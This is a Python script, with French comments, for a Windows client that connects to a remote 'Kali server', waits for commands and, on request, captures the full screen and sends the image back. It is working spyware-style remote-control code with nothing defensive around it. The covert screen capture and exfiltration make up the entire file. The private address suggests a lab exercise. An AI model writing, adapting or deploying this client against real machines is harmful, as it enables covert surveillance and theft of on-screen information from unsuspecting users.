import socket
import time
import win32api
import win32con
import win32gui
import win32ui
import os
from datetime import datetime
from PIL import Image

SERVER_IP = "192.168.1.67" 
PORT = 5001

def get_dimensions():
    """Récupère les dimensions de l'écran Windows."""
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot():
    """Prend une capture d'écran et l'enregistre en JPEG"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    bmp_filename = f'screenshot_{timestamp}.bmp'
    jpg_filename = f'screenshot_{timestamp}.jpg'

    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, bmp_filename)

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    with Image.open(bmp_filename) as img:
        img.save(jpg_filename, "JPEG", quality=50)  
    os.remove(bmp_filename)

    return jpg_filename

def connect_to_server():
    """Se connecte au serveur Kali et exécute les commandes reçues."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.connect((SERVER_IP, PORT))
            print(f"[+] Connecté à {SERVER_IP}:{PORT}")

            while True:
                command = client.recv(1024).decode()
                if not command:
                    break

                if command == "screenshot":
                    print("[+] Capture d'écran demandée...")
                    filename = screenshot()

                    with open(filename, "rb") as f:
                        client.sendall(f.read())

                    print("[+] Capture envoyée.")
                    os.remove(filename)  

                elif command == "exit":
                    print("[+] Fermeture de la connexion")
                    break

        except ConnectionRefusedError:
            print("[-] Impossible de se connecter au serveur. Vérifie l'IP et le port.")

if __name__ == "__main__":
    connect_to_server()
